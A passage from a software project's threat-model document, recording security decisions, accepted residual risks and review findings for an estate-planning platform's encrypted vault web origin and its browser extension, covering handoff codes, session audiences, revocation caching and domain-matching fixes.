The discriminator is that in the right-hand column the ACTOR and the
NOTIFICATION RECIPIENT are different people. Refusing there on the OWNER's
unverified address would let an owner's own typo permanently deny a legitimate
grantee, redeemer or reporter — the M6 rule that the protective action must
never be harder, pointed the other way — and applied to §5.1 intake it becomes a
denial of service against exactly the dormant, never-verified owner a fraudulent
report targets. Those paths record `sent_unverified` in the send log and an
`unverified_recipient` audit event instead.

**One approved deviation from M9's content doctrine.** The platform now mails a
variable that is not a date. It is a typed `code`, never a `text` field:
platform-authored (`randomBytes`), opaque, single-use, short-lived. The subject
is unchanged and there is still NO LINK, so "we never link you" stays literally
true. It travels on its own route behind its own credential, and `SendSchema` is
built from a kind list that EXCLUDES it, so a send-credential holder — vault,
settlement, profile — cannot fire it.

### Residuals

- **[CLOSED: §6n]** *A user who mistypes their address at registration cannot fix it.* There is no
  address-change route anywhere in the platform, and verification can only ever
  target the address already on file. In production such a user is permanently
  refused escrow `configure`, `rearm` and link-code `invite`, with no
  self-service and no operator remedy (that belongs to the TB7 operator
  platform). The arming gates' justification — "refusing costs them an action
  they can unblock themselves" — is true for the intended contrast (actor ==
  recipient) and FALSE as an unconditional claim; it is recorded here rather than
  softened. It fails in the safe direction. **CLOSED by M17 PR4 (§6n)**: the
  change ceremony proves the NEW address before anything on file moves, so a
  mistyped registration address is now recoverable by changing to a correct
  one — and the written obligation this paragraph carried (clear the verified
  bit, invalidate outstanding codes) was discharged one step stronger than it
  asked: no unproven address ever reaches the delivery store, so the bit is
  stamped by replacement rather than cleared, and outstanding codes die in the
  same transaction as the switch.
- **[ACCEPTED]** *A SEND-credential holder can read any user's verified bit* by firing one
  notification at them, because the send response carries `recipientVerified` —
  deliberately, so settlement can record the fact without holding the STATUS
  credential. What the STATUS edge still withholds is the SILENT read: a send
  costs the subject a real estate alarm, a committed send-log row and an audit
  event. A weaker oracle, not none. The M14 security review found the credential
  graph claiming the send edge exposed no delivery state at all; that sentence
  is corrected rather than the field removed.
- **[ACCEPTED]** *An unreachable status route refuses every arming action.* The gates fail
  closed on an unanswerable query, so a notifications outage suspends escrow
  configuration, re-arming and link-code minting entirely. That is the intended
  direction — blocking delays a legitimate owner by minutes where the other
  direction hands an attacker a whole waiting period — but it is a total outage
  of those paths, not a degradation, and it is the first network round trip
  those gates have ever made.
- **[OWNER: E1]** *An authenticated attacker can sustain one mail per five minutes to an
  address they typed into their own registration.* The re-issue floor is
  per-account, with no per-address, per-IP or global cap, so a single arbitrary
  address can be sent roughly 288 content-free "confirm this address" messages a
  day. UNCHANGED by M17 PR1: that change bounds login and register, and this is
  an AUTHENTICATED route whose only limit remains its own five-minute re-issue
  floor. "Rate limiting is absent platform-wide" was true when written and is
  now narrower — the platform has three bounds (step-up, login, register) and
  this route is behind none of them.
- **[OWNER: M29]** *Registration's fixed-shape, fixed-time response is still owed.* M14 closed
  the address-ownership half of §5.3's enumeration residual and did NOT close
  the timing half: `register` still awaits KMS, inserts and Kafka publishes on
  the new-email path only. Recorded in `auth.service.ts` and unchanged here.
## 6i. Threat-model delta — M15 the vault surface (2026-08-08)

M6 activated **TB6 (client device)** in the library. M15 activates it in the
BROWSER, which is where risk #4 (vault client-side compromise, Critical) has
always actually lived: until now no page in this product ever held a Zone A key,
so every TB6 control in §4 was a requirement with no surface to apply to. §6a
recorded that plainly — "the isolated vault origin, CSP, and Trusted Types are
frontend controls; no vault UI ships in M6, so they land with that surface."
This is that surface. PR1 deliberately ships the boundary with NO vault crypto
behind it yet.

**The §4 TB6 controls, now shipped and their status.**
- *Isolated vault origin:* shipped. A different HOST (`vault.localhost:3010`
  locally, `vault.<domain>` in production), not a different port — MEASURED,
  because cookie scope ignores the port and a port-only split would have sent
  the app's session to the vault on every request. The vault's cookie carries
  the `__Host-` prefix, so host-only is enforced by the browser rather than by
  convention, which is what makes a same-registrable-domain deployment safe.
- *Strict CSP:* shipped, and stricter than the main app's honest-partial one.
  `default-src 'none'`, `script-src 'self'` with NO `unsafe-inline` and NO
  `unsafe-eval` in ANY environment, `connect-src 'self'`, `img-src 'self'` (no
  `data:`), `frame-ancestors 'none'`, `base-uri 'none'`.
- *Trusted Types:* shipped and ENFORCED — `require-trusted-types-for 'script'`
  with `trusted-types 'none'`, so no policy may be created and every DOM XSS
  sink throws. This is only possible because the client is framework-free; a
  framework that templates through `innerHTML` needs a permissive policy, which
  is the control in name only. Verified in a real browser: policy creation
  refused, `innerHTML` threw with zero nodes created, `eval`/`new Function` threw
  EvalError from page context.
- *No third-party scripts on vault surfaces:* shipped, and stronger than an
  allowlist — there is no bundler and no dependency tree. The browser client
  imports only relative paths and (from PR2) `@estate/vault-crypto` by absolute
  path from this origin. Enforced by a source fence.
- *Re-auth on vault open:* shipped. Minting the handoff requires a fresh step-up,
  and the vault service's own SRP legs are step-up gated (M6).
- *WebCrypto non-extractable keys, memory zeroization, clipboard auto-clear:*
  SHIPPED IN PR2. The master key is unwrapped as a non-extractable `CryptoKey`,
  so an injected script on this origin could use it but not read it out. Byte
  arrays are wiped where they exist; the `CryptoKey` itself has no bytes this
  client can zero, and that limit is stated in the code rather than left to be
  read as a stronger promise. Clipboard auto-clear is 20 seconds and is
  described to the user as best effort, because a page cannot read the clipboard
  to check, cannot reach a clipboard manager or a synced clipboard, and never
  clears at all if the tab is closed first.
- *Re-auth on vault open, in full:* the handoff needs a fresh step-up, and the
  vault's own SRP legs are step-up gated. PR2 adds a client-side idle lock at 5
  minutes and a `pagehide` lock, so a bfcache restore returns locked rather than
  with keys in memory.

**New in the threat model: the handoff itself.** Authority now crosses an origin
boundary, which is a channel that did not previously exist. It is a single-use
160-bit code, minted under step-up, delivered by a top-level form POST (never a
URL, a fragment, or a `Referer`), burned on the ATTEMPT, and redeemed
server-side for a session that is `vault`-audience, 15 minutes, and carries NO
refresh token. Deny-by-default audience enforcement means that session opens the
vault service and nothing else — measured across every service. A vault session
cannot mint another handoff, so a leak cannot chain forward.

**Residuals accepted, and why.**
- **[ACCEPTED]** *The handoff is a bearer capability for 60 seconds.* Anyone holding it can
  redeem it, because the redeem route takes no other selector — which is
  deliberate, since a route that could name an account would be an enumeration
  oracle (§6g's rule). Bounded by the window, single use, TLS in production, and
  by the fact that redemption yields a session that decrypts nothing.
- **[ACCEPTED]** *The vault origin sees contact NAMES* (from PR3's grantee picker, projected at
  the edge to `{contactId, linkedUserId, name}` and filtered to linked contacts).
  Unavoidable rather than accepted lightly: an owner confirming a key
  fingerprint out of band must know whose key it is. No other Zone B field can
  cross.
- **[OWNER: E1]** *A subdomain shares a registrable domain with the app.* `__Host-` makes the
  cookie host-only at the browser, so the practical exposure is a cookie set
  with an explicit `Domain=` on the parent — which nothing in this repo does. A
  separate registrable domain closes it entirely and is a deployment choice.
- **[ACCEPTED]** *`script-src 'self'` trusts this origin's own served files.* A CSP is a
  browser-side control and cannot defend against a compromised BUILD; the
  supply-chain half is the empty dependency tree and the absence of a bundler,
  not this header.
- **[OWNER: E1]** *No rate limiting on handoff minting.* The cross-reference is corrected rather
  than the residual closed: identity's login bound shipped in M17 PR1 (§6k) and
  does not reach this route, which is authenticated and step-up gated — so the
  M16 attempt cap already stands in front of it, and what remains unbounded is a
  caller who holds a genuine step-up. Interim bound: one unspent handoff per
  user, enforced by a partial unique index, so pressing the button repeatedly
  leaves one live credential rather than many.

**The Secret Key on the device, as a residual rather than a control.** PR2
persists it in IndexedDB by default, with an explicit opt-out. Under XSS on this
origin it is readable — localStorage and IndexedDB alike, since no browser
primitive hides bytes from same-origin script — so the mitigation is the empty
dependency tree, `script-src 'self'` and enforced Trusted Types, not the storage
API. The default is deliberate: requiring 26 retyped characters at every unlock
reliably moves the key to a text file on the desktop, which is worse. The vault
PASSWORD is never persisted, so a stolen Secret Key alone opens nothing.

**PR3 — emergency access reaches a user, and §5.2's ceremony becomes real.**

*The out-of-band fingerprint confirmation is now a shipped control rather than a
design.* Until PR3 the 16-symbol fingerprint the M6 review widened had no client
at all, so key substitution by a malicious server — which `grantee_public_key_
sha256` cannot detect, because that digest is derived from whatever key the
client was handed — was mitigated only on paper. The screen shows the
fingerprint, tells the owner to check it by phone or in person and NOT through
this platform, and refuses to arm until at least one candidate is confirmed.

*A design that could not complete.* M6's `wrapped_private_key` was written and
never served, so a grantee could not open a share sealed to them and no release
could ever finish. Closed by an own-key route gated on an OPEN VAULT, which also
states the property that makes emergency access safe to expose: a stolen bearer
reaches the release route and comes away with ciphertext it cannot open, because
the private half lives inside the grantee's own vault.

*A NEW disclosure, bounded and declared.* Contact names now cross onto the vault
origin. The read is a dedicated profile route whose entire response is a contact
id, an account id and a name, it is the ONLY route in that service a
`vault`-audience session may reach, and both facts are declared as data in
`AUDIENCE_ROUTE_ADMITTERS` and checked against source in both directions. What a
leaked vault handoff buys at profile is therefore exactly that projection for the
owner's own linked contacts — measured against the live service, not argued: the
same token is refused 401 at `/v1/contacts`, `/v1/contacts/:id`, `/v1/profile`,
`/v1/profile/family` and `/v1/role-assignments`. The alternative considered and
REJECTED was a service-wide widening, which would have handed that token the
owner's PII, every contact's decrypted detail, the family tree and the roles.

*Residual, unchanged from M6 and restated because a UI does not fix it:* a server
that releases its platform half early defeats the waiting period. The
compensating controls are the audit trail and owner notification, both of which
this surface now exercises — a request, a refusal and a denial each produce an
ids-and-enums audit event, and the owner's screen offers denial as one ungated
tap.

*Residual, new:* the grantee picker's names come from the candidate list, so a
contact deleted after an arrangement was made shows as an account id. The row
still renders and can still be removed — hiding a live arrangement would be the
worse failure — but the owner sees an opaque id rather than a person.

**PR4 — the security review, and the boundary it found crossed.**

*The isolation held for confidentiality and not for destruction.* Reaching the
vault API was never opening a vault — that needs the vault password and the
Secret Key, neither of which this platform holds. But `POST /v1/vault/reset` is
gated on step-up ALONE, deliberately, because a lost vault password cannot be
proven; and handoff redemption granted step-up. So a stolen 60-second code
crypto-shredded every item, the emergency escrow and the recovery keypair. The
escalation is the sharp part: app-origin script cannot MINT a handoff (minting is
step-up gated) but can read one out of the hidden field it is posted in, so
stealing a code converted no-step-up into step-up authority over Zone A — and
the app origin is the weaker one, since its `script-src` is not locked down
(M11). CLOSED: redemption grants no step-up, and the vault origin proves its own
factor through `POST /v1/auth/stepup`, the route widened in PR1 for exactly this.

*The fingerprint ceremony had one side.* The owner reads a code out; the grantee
had nowhere to read theirs, so the only defence against a malicious server
substituting its own key for a grantee's could not be exercised.
`grantee_public_key_sha256` cannot substitute for it — it is derived client-side
from whatever key the client was handed. CLOSED: the grantee's own fingerprint is
displayed, computed from the key the server serves back.

*Residual, unchanged and now stated on the screen rather than implied:* a
released escrow reconstructs the owner's recovery key and this client cannot yet
read their items with it. Release is one-shot, so pressing the button spends the
arrangement. The warning is given BEFORE the action; the reader is a separate
change with its own retention decision, because holding a second owner's master
key in memory is not something to settle inside a fix round.

*Residual, accepted:* an M-of-N escrow above threshold 1 is refused by this
client at both layers. The protocol and the service support it; collecting
several grantees' shares does not exist, and arming an arrangement nobody can
open would be worse than declining to arm it.

## 6j. Threat-model delta — M16 the vault browser extension (2026-08-10)

M16 opens **TB9** (§3, §4): the extension against arbitrary web pages. This
section is written as PR1 begins and is updated by each PR as its controls land,
rather than assembled after the review — the M14 rule that a milestone which
invalidates a sentence owns that sentence.

**Why this is not TB6 with a new client.** TB6's controls are the isolated
origin, its CSP, enforced Trusted Types and an empty dependency tree. None of
them reaches a page we do not serve. An extension is code of ours running beside
code of theirs, on their origin, with read and write access to their DOM — a
channel with no counterpart anywhere else in the platform.

**Decisions and their residuals.** The full list is in docs/04 M16 and the
CLAUDE.md decision log; the security-relevant shape is:

- *Keys* live as non-extractable `CryptoKey`s in an offscreen document, the only
  extension context that loads `@estate/vault-crypto`. Persisting a `CryptoKey`
  in extension IndexedDB — possible, and the option the brief's premise hid — is
  REFUSED, because it yields a vault permanently open with no password, no
  Secret Key and no TOTP, defeating 2SKD and §5 of docs/01. *Residual:* while
  unlocked, code in that context decrypts everything; non-extractability stops
  exfiltration, not use.
- *The extension is server-anchored.* It caches item ciphertext and nothing that
  enables an offline unlock, so the offline brute-force target M15 kept off the
  disk stays off it. *Residual:* no unlock without connectivity.
- *Origin matching* is the boundary's defining control; see §4 TB9.
- *The credential* is a refresh-capable `extension`-audience session, admitted
  PER HANDLER to SEVEN vault routes (`keysetStatus`, both SRP legs, `listItems`,
  `createItem`, `updateItem`,
  `lock`) and THREE identity ones (`session`, `stepUp`, `logout`). What a stolen
  copy buys, end to end: the ability to attempt an SRP handshake, which
  additionally requires a fresh step-up, the vault password and the Secret Key —
  and no item, because every item route — read OR write — is behind
  `VaultSessionGuard`. SIXTEEN vault routes refuse it, including `reset`, both
  keyset routes, `deleteItem` and every emergency-access route; so does
  `mintHandoff`, so a leaked extension session cannot chain itself into a vault
  one. (It was eighteen until M16 PR4a admitted the two writes; the count is
  derived from the controllers by `session-audience.spec.ts`, so it cannot drift
  from the code — only from this sentence, which is why the sentence is edited
  with it.)
  *Stale by construction, and deliberately not edited:*
  `apps/services/identity/migrations/006_extension_audience.sql` still says
  "five vault routes". The migrator checksums applied files and raises
  `MigrationDriftError` on a mismatch, so correcting it would break every
  deployment that has already run it. A migration is a record of what was true
  when it ran; the live count lives here and in the spec that derives it.
  `POST /v1/auth/refresh` is deliberately absent from that count and is not an
  omission: it carries no guard at all, being unauthenticated by construction,
  so there is no audience decision to declare there. What keeps it safe is a
  different property — refresh ROTATES IN PLACE, updating the same session row,
  so a refreshed session cannot change what it is for. That was true by accident
  of an UPDATE's SET list until M16 pinned it with a test.

**What M16 closes that predates it.**

- **[OWNER: M27]** *§6a's rate-limiting residual, in part.* Step-up now carries an attempt cap
  derived from the append-only `auth_events` ledger, which bounds the vault's SRP
  legs TRANSITIVELY because both are step-up gated. The half that remains open is
  a caller with a genuine step-up burning handshakes.
- *No user-reachable session revocation.* Before M16, `revokeAllForUser` had one
  caller behind a service credential, and identity exposed no session listing, no
  revoke-by-id and no password-change or password-reset route — so the only way
  to revoke a session was to present it. (M17 PR2 closed the password-CHANGE
  half of that sentence and PR3 closed the RESET half, so identity now exposes
  all three. It also gives the sentence a second
  meaning: a password change now revokes every OTHER session in the same
  transaction, so the ordinary remedy for "something has my credentials" is one
  action rather than a per-row sweep.) Tolerable while every session was one
  cookie-bound browser; not tolerable beside a long-lived credential on a device.
  PR1 ships the first paired-devices list with per-row revoke, ON A SURFACE and
  in the same PR as the routes: an owner can see every live credential on their
  account and end any of them. Revocation is deliberately UNGATED — the M6 rule
  that the protective action must never be harder than the permissive one, with
  minting the pairing code as the gated half — while the row for the caller's
  OWN session goes through logout instead, because only logout also expires the
  cookies carrying it, and a browser that still looks signed in over a dead
  session is the M8 logout entry's worst outcome. What a row can SAY is bounded
  by what identity returns: an audience and two timestamps, no IP and no device
  name, since those columns exist and nothing writes them. So a row identifies a
  credential by what it can REACH rather than by where it is — which is also the
  one place a user reads the boundary this milestone exists to create.
- *A fence that was documented and never written.* `004_session_audience_and_
  handoffs.sql` claimed a spec pinned its `CHECK` to `SESSION_AUDIENCES`; none
  existed. PR1 writes it, mutation-tested.

**Residuals carried, not closed.**

- **[OWNER: M26]** *A paired-devices row cannot identify a device.* The
  headline residual it sits under — "no user-reachable session revocation" — is
  genuinely closed by PR1's list with per-row revoke, and by §6l and §6m for
  the change and reset halves. Its LAST sentences are not: `sessions.ip_ct` and
  `sessions.device_id` are declared in `001_auth_schema.sql` and the only
  mention of either identifier anywhere in identity's `src` is the comment in
  `sessions.repo.ts` explaining that nothing writes them, so `listLiveForUser`
  returns an audience and two timestamps. An owner with two browser sessions,
  or two paired extensions, sees rows they cannot tell apart, on the one screen
  whose purpose is to end the compromised one. Split out here because a
  remainder riding a closure is exactly what this sweep exists to surface, and
  the closure's own framing — "a row identifies a credential by what it can
  REACH rather than by where it is" — is what made it read as settled.
- **[ACCEPTED]** *A compromised store update is undetectable by the platform.* Reproducible
  builds and published provenance make it discoverable by a third party.
- **[ACCEPTED]** *Autofill does not resist phishing.*
- **[ACCEPTED]** *App-origin script can read a pairing code out of the DOM*, buying a paired
  extension that reaches ciphertext only and appears in the owner's device list.
  PR1's surface displays the code in a `<code>` text node, deliberately behind a
  step-up and shown once, which is the shape M13's link code already takes; what
  it does not do — and cannot, on an origin whose `script-src` M11 recorded as
  not locked down — is keep script on that origin from reading it. The device
  list is what makes the result VISIBLE rather than silent.
- **[OWNER: E1]** *An older audit consumer drops an action it does not know.* A rolling deploy
  where identity is ahead of the audit service loses those events: an
  unrecognised action is a `schema_violation` to the consumer, indistinguishable
  from malformed input. Observed as absence during PR1's live drive (the mint
  and pairing events emitted before the audit service was rebuilt never reached
  `audit_events`); the rejection itself was read from `ingestor.ts` rather than
  seen, because the container's logs did not survive its restart. Deploy order —
  contracts consumers first — is the mitigation, and it is not enforced anywhere.
- **[ACCEPTED]** *Rotation-reuse detection can self-revoke* an extension whose service worker
  died mid-rotation. The behaviour is correct; the cost is a re-pair.
- **[ACCEPTED]** *REVOKING A PAIRED DEVICE IS NOT INSTANT DOWNSTREAM.* Identity revokes the row
  synchronously and answers 401 immediately, but every other service resolves a
  caller through `HttpSessionVerifier`, whose positive cache is keyed by
  sha256(token) with `DEFAULT_CACHE_TTL_MS` of 30 seconds (2026-07-23). So a
  revoked extension session keeps working at the vault service for up to that
  window. MEASURED in PR1's live drive rather than reasoned about: immediately
  after the revoke, identity answered 401 and the vault answered 200; 33 seconds
  later the vault answered 401.

  The cache itself is a deliberate trade and is not the problem — negatives are
  never cached, precisely so a transient identity outage cannot lock out valid
  tokens. What M16 changes is the COST of that window. Before, it meant a
  revoked browser session lingered briefly. Now the product ships a control whose
  stated purpose is "I think my extension is compromised, kill it", and the
  credential outlives the screen that says it is gone.

  Bounded rather than alarming: what survives the window is a session that
  reaches seven vault routes, five of which yield ciphertext and two of which WRITE it — the item
  reads sit behind `VaultSessionGuard`, which needs a completed SRP unlock, and
  that needs the vault password and the device Secret Key. It cannot reset a
  vault, replace a keyset, delete an item, touch emergency access, or mint
  another credential. The 30 seconds buy an attacker who already holds the token
  nothing they did not have a moment earlier.

  What was OWED is that the surface not promise more than the platform delivers.
  A revoke control that reads as instantaneous while a downstream service still
  admits the token is the M9 shape inverted — not a control reading as an
  outage, but an outage-free UI reading as a stronger control than it is.
  Shortening the TTL is the wrong fix (it trades a stated availability property
  for a cosmetic one); saying so on the screen is the right one.

  *CLOSED 2026-08-12, as copy.* `SecurityPanel` said "that takes effect
  immediately" above the list and "can no longer be used" after a revoke; both
  were false for up to one TTL. One `PROPAGATION_SENTENCE` now serves both
  sites — "signing in with it is refused straight away; other parts of the
  platform can take up to N seconds to stop accepting it" — so the confirmation
  someone reads while acting on a suspected compromise carries the same caveat
  as the paragraph they may never have read. N is DERIVED from
  `SESSION_CACHE_TTL_MS`, which `step-up.test.ts` already pins to auth-guard's
  `DEFAULT_CACHE_TTL_MS` by reading that file, so raising the TTL moves the
  sentence rather than falsifying it again. The window itself is unchanged and
  remains the deliberate trade it always was.

**Added by PR2a (the extension and its transport).**

- *The refresh token is on disk.* `chrome.storage.local` is not memory-backed, so
  a paired device keeps a refresh-capable credential for up to its 30-day life
  where local malware or another process running as the user can read it.
  `chrome.storage.session` was rejected for it: pairing is deliberately once per
  browser and repeating it needs a step-up on the APP origin, so a device that
  forgot its pairing on every browser restart would push people through that
  ceremony daily and, predictably, into not using the extension. WHAT BOUNDS IT
  IS THE AUDIENCE, not the storage — the credential reaches seven vault routes and
  three identity ones and nothing else, cannot reset a vault, replace a keyset,
  delete an item, touch emergency access, mint another handoff or enumerate the
  owner's other devices, and still decrypts nothing, because every item read sits
  behind a vault session that only a completed SRP unlock produces. It is also
  visible in the owner's paired-devices list and revocable from there in one
  click. No key material is ever written there, in PR2b or later.
- *One more unauthenticated identity route is reachable through the vault
  origin.* The edge proxies `POST /v1/auth/refresh` (and pairing redemption) as
  credential-free pass-throughs, so that the extension needs one
  `host_permission` and one origin rather than addressing identity directly. Both
  are exact-match paths carrying no bearer, neither can be READ cross-site
  because this edge sets no CORS headers and answers no preflight, and identity's
  own uniform refusals are unchanged. `POST /v1/auth/logout/refresh` remains
  deliberately unreachable.
- *The revocation window above, confirmed from the other end.* PR2a's live drive
  measured it from the extension's side rather than the owner's: after logout,
  identity refused the token at t+0 while the vault — reached through the edge on
  the same token — answered 200 at t+0 and t+10 and 401 from t+20. Same 30-second
  positive cache, same conclusion, two independent measurements.

**Added by PR2b (unlock and read).**

- *The Secret Key is remembered on disk, so two of three factors sit on one
  disk.* 2SKD derives every vault key from the vault password AND a 128-bit
  device Secret Key; the extension keeps the latter in its IndexedDB by default,
  with an explicit opt-out and copy saying what that costs. The alternative —
  retyping 26 characters at every unlock, against a 15-minute vault session that
  cannot be renewed — reliably pushes people to a text file, which is worse. But
  this artifact ALREADY holds a 30-day refresh token on disk, so local malware
  or another process running as the user now finds both, missing only the
  password; and unlike the vault ORIGIN, whose defence is an empty dependency
  tree, `script-src 'self'` and enforced Trusted Types, this is a signed artifact
  auto-updated through a vendor store with no CSP in its path (§4 TB9). WHAT IT
  STILL DOES NOT BUY IS AN OFFLINE UNLOCK: the wrapped master key, the SRP salt
  and the KDF parameters arrive from the server per unlock and are never stored,
  so opening a vault needs the password and a live handshake on a live extension
  session — which appears in the owner's paired-devices list and is revocable
  from there in one click. The Secret Key is forgotten when the device is
  disconnected.
- *The offscreen document is not a boundary against the rest of the extension,
  and must not be read as one.* `chrome.runtime.sendMessage` delivers to every
  extension context with a listener, so the vault password and Secret Key transit
  a broadcast the service worker also receives and ignores by `target`. That is
  a routing filter. All extension contexts are one signed artifact and one trust
  domain: the offscreen document buys LIFETIME (an MV3 service worker is
  terminated in seconds) and NON-EXTRACTABLE key storage, not secrecy from the
  popup. Anyone who can read that channel has already compromised the artifact
  and could ask the worker to decrypt instead. What the split does buy is
  auditability — the key holder cannot reach the network and the host cannot
  decrypt, so "can anything derived from the password leave the device" is a
  one-file question.
- *IT HAS RUN IN A BROWSER NOW, AND CI RUNS IT EVERY TIME.* This paragraph used
  to open "NOTHING HERE HAS RUN IN A BROWSER" and to explain that CI could not
  load a packed extension. The second half was wrong — `--load-extension` is
  refused by Chrome 151, but the CDP command `Extensions.loadUnpacked` is not —
  and the `browser-smoke` job in `.github/workflows/extension.yml` is what that
  correction bought. It EXTRACTS THE PACKED ARCHIVE and drives those bytes: the
  manifest is accepted by Chrome, the service worker boots,
  `chrome.offscreen.createDocument` succeeds from it, the offscreen document
  comes up, `/lib/vault-crypto/index.js` resolves at the absolute path the
  client actually loads, and a REAL SRP-6a unlock against a stand-in speaking
  the real protocol returns an unlocked vault whose item decrypts to its title.
  A wrong Secret Key is refused BY THE SERVER. Finally the central claim —
  nothing derived from the vault password or the Secret Key leaves the device —
  is asserted over bytes that crossed a real socket out of a real browser, which
  is a materially stronger statement than the same assertion against a recording
  transport in Node.
  *Still not exercised, and named rather than implied:* the FILL, because
  `activeTab` needs a genuine user invocation and a programmatic
  `chrome.action.openPopup()` grants nothing (measured); IndexedDB under the
  extension origin; and anything about the real vault SERVICE, since the
  stand-in has no sessions, audiences, step-up or guards. This is the same status the
  repository gives the Plaid live client and the Anthropic adapter — the first
  real load is a deployment event, not a test result — and it is stated here
  rather than left to be inferred from a green suite.
- *The IndexedDB premise is now MEASURED, and the brief was wrong about it.* The
  roadmap REJECTS persisting a non-extractable `CryptoKey` in extension
  IndexedDB on CEREMONY grounds — it would yield a vault permanently open with
  no password, Secret Key or TOTP, defeating 2SKD and docs/01 §5 — and
  explicitly NOT on the brief's serializability grounds, which CLAUDE.md
  recorded as a claim to measure. PR1 did not measure it; PR2b has, in a real
  Chromium: a non-extractable `CryptoKey` structured-clones successfully and the
  clone is still `extractable: false`; IndexedDB accepts it; and after a page
  navigation it comes back as a `CryptoKey`, still non-extractable, with
  `exportKey` still refusing and an AES-GCM round trip still working. So the
  brief's premise is FALSE in the direction that matters, exactly as docs/04's
  correction claimed — now demonstrated rather than asserted. THE REJECTION IS
  UNAFFECTED: it never rested on that premise, and a key that persists this well
  is precisely what makes the ceremony argument bite.
  *Still unmeasured, and handed over rather than claimed:* survival across a full
  BROWSER RESTART, and the same sequence under a real `chrome-extension://`
  origin. A scratch unpacked probe exists for both; it is deliberately not
  committed, because a key-persistence harness inside an artifact that must not
  persist keys is the wrong thing to be right about.

**Added by PR3a (origin matching).**

- *Confusable detection is partial, and §4 TB9 now says so.* Caught: punycode
  that is not the saved domain, an ASCII homoglyph skeleton fold, and
  edit-distance-1. Not caught: the general Unicode confusable case, which needs
  UTS #39 skeletons over a vendored confusables table — a named follow-up. The
  failure direction is safe: an unrecognised confusable is a `no-match`, so it is
  refused for filling and merely goes unexplained. Worth stating because the
  scope decision for this PR was taken on a claim that `rn`/`m` was covered by
  edit distance, which it is not — the homoglyph fold exists because a test
  refused to pass.
- *WRITE AND FILL ARE ONE TRUST LEVEL, and that is the sharpest consequence of
  M16 PR4a.* The item's `url` lives INSIDE the encrypted blob, and `fillFor`
  re-decides the origin from it — so anything that can write an item can repoint
  where that item's credential is later filled. The origin control is not
  bypassed; it is FED. This buys an attacker persistence rather than access
  (writing already requires an unlocked vault, and anything that can write can
  also read the credential outright), but it survives the session in which it
  was done, which reading does not. Treat "may write items" as equivalent to
  "may direct where those credentials go", and never grant one expecting the
  other to bound it.
- *An unlocked extension can overwrite every item, and there is no restore
  surface.* `deleteItem` stays refused, so the destructive verb is out, and
  `vault_items_versions` captures BEFORE UPDATE OR DELETE — but NO PRODUCTION
  CODE READS THAT TABLE. Recovery today means an operator with psql. "Recoverable"
  is therefore true of the data and not of the product, and the two are recorded
  apart rather than allowed to sound like one claim. A restore surface is the
  obvious follow-up and belongs with the operator platform (TB7).
- *An edit needs no read, and that was a choice rather than a limitation.* The
  popup cannot open an item: `summarise` yields titles and `fillFor` yields one
  credential for a page that matches. Editing normally requires reading the item
  back, which would have made the popup a general vault reader. Instead the key
  holder MERGES — the caller sends only the fields it is changing, and the
  plaintext it did not send is never sent back. The cost, stated on screen: a
  field left blank keeps its saved value, so clearing one is not expressible in
  the extension.
- *A stale Public Suffix List over-matches, narrowly.* The snapshot is vendored
  and digest-pinned because this package must not fetch a security parameter at
  runtime, which trades tampering-in-transit for staleness. A suffix added after
  the snapshot is unknown, so `registrableDomain` falls back to the implicit `*`
  rule and returns a SHORTER domain — which can make two hosts under a new
  multi-label registry compare equal. The staleness check is deliberately a
  one-year bound rather than a weekly one, because a check that fails constantly
  is one people learn to bump.
- *THE SAME OVER-MATCH HAPPENED FOR EVERY INTERNATIONALISED SUFFIX, and it was
  neither narrow nor hypothetical — found while scoping PR3b, fixed before it.*
  The published list writes internationalised rules as U-LABELS (`公司.cn`)
  while `URL.hostname` applies IDNA and always returns the A-LABEL
  (`a.公司.cn` → `a.xn--55qx5d.cn`). `labelsMatch` compares raw strings and
  nothing converted, so 459 of the 10,239 rules were absent from the algorithm
  entirely: the longest match fell back to the bare TLD, every registrant under
  those registries collapsed onto ONE registrable domain, and `matchOrigin`
  answered `match` for two different registrants. Measured, not reasoned about —
  `bank.公司.cn` and `shop.公司.cn` both resolved to `xn--55qx5d.cn` and
  compared equal, which is a credential offered on somebody else's site. That is
  the label-stripping failure this section calls the boundary's defining one,
  reached by a route the ASCII tests could never take, which is why every one of
  them passed over it. Rules are converted at GENERATION time now, so the
  vendored `.dat` stays byte-for-byte as published, the runtime stays a plain
  string compare, and no IDN implementation enters a package with no
  dependencies. It was latent while PR3a had no fill; PR3b is what would have
  made it exploitable.
**Added by PR5 (the security review).**

Seven file-scoped discovery lenses over the M16 range, then every candidate
confirmed by MEASUREMENT — mutation or execution against real Postgres, a real
jsdom page, or the modules run directly — before anything was changed. TENTH
milestone running where every confirmed finding sits in machinery the milestone
introduced, with one exception that is the most serious thing in the list and is
older than M16.

- **[OWNER: M29]** *AND THE FIRST FIX WAS TOO NARROW — the same escalation was still open through
  WEBAUTHN, found by verifying it.* `POST /v1/auth/webauthn/register/verify` was
  `SessionGuard`-only and `WebAuthnService` grants step-up on a successful
  assertion, so a caller holding nothing but a session could bind an
  authenticator OF THEIR OWN and elevate with it. MEASURED end to end against
  real Postgres before anything was changed: registration succeeded, and the
  attacker's session row came back `mfa_level=stepup` with a live
  `stepup_expires_at`. `excludeCredentials` looks protective and is not — it
  stops re-registering the SAME authenticator, never a different one.
  It was QUIETER than the TOTP version, which is the part worth remembering.
  That one locked the owner out (`findActiveTotp` takes the newest, so their
  codes started failing — a signal); here the victim's factors keep working, so
  nothing they can observe changes. And it also cleared the M16 step-up attempt
  cap, since WebAuthn writes `stepup.granted`.
  A PER-TYPE PREDICATE LEFT A HOLE IN BOTH DIRECTIONS: `hasVerifiedTotp` is
  false for an account holding only a passkey, so the TOTP-only fix would still
  have admitted a session-only caller enrolling TOTP on a passkey-protected
  account. **Closed** by `SecondFactorGate`, one predicate over both stores —
  "does this account hold ANY factor it could be made to prove" — called from
  `enrollTotp` and from BOTH ends of the WebAuthn registration ceremony (the
  options end so a refusal comes before the hardware ceremony, the verify end
  because that is the write). The bootstrap residual is unchanged and still
  stated: a first factor cannot be gated, so an account with none is still
  reachable by a stolen session.
- *THE GATE IS INVISIBLE TO EVERY OTHER FENCE, WHICH IS WHY IT HAS ITS OWN.*
  The condition is account state, so the gate cannot be a `StepUpGuard`
  decorator — and every fence in this repo that checks step-up gating scans for
  that decorator. That is precisely how the WebAuthn route sat ungated while its
  TOTP twin was being fixed one file away.
  `apps/services/identity/test/factor-routes.spec.ts` closes it, and it
  discovers by WHAT THE CODE DOES rather than by a remembered list: it scans for
  calls to the repo methods that WRITE factor state, resolving the receiver from
  its TYPE annotation rather than its field name, so a new enrolment path is
  found by the write it has to make whatever it is called. Mutation-tested four
